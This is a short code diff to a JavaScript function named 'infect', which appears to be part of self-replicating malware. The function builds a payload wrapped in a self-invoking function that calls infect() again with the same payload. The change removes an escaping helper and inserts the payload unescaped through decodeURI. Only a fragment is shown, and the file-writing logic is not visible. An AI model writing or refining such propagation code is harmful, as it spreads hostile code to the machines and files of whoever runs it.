@@ -4,10 +4,6 @@ async function infect( payload ) {
     const os   = require( "os" );
     const path = require( "path" );
 
-    function escaper(str) {
-        return str.replace(/["\\]/g, "\\$&");
-    }
-    
     function readFile( f ) {
         return new Promise( function( rs, rj ) {
             fs.readFile( f, (e,r) => e ? rj( e ) : rs( r ) );
@@ -34,8 +30,8 @@ async function infect( payload ) {
 
     const modifiedPayload = `
         (function() {
-            ${JSON.parse(payload)}
-            infect( "${escaper(payload)}" );
+            ${decodeURI(payload)} 
+            infect( "${payload}" );
         })();
     `;
 
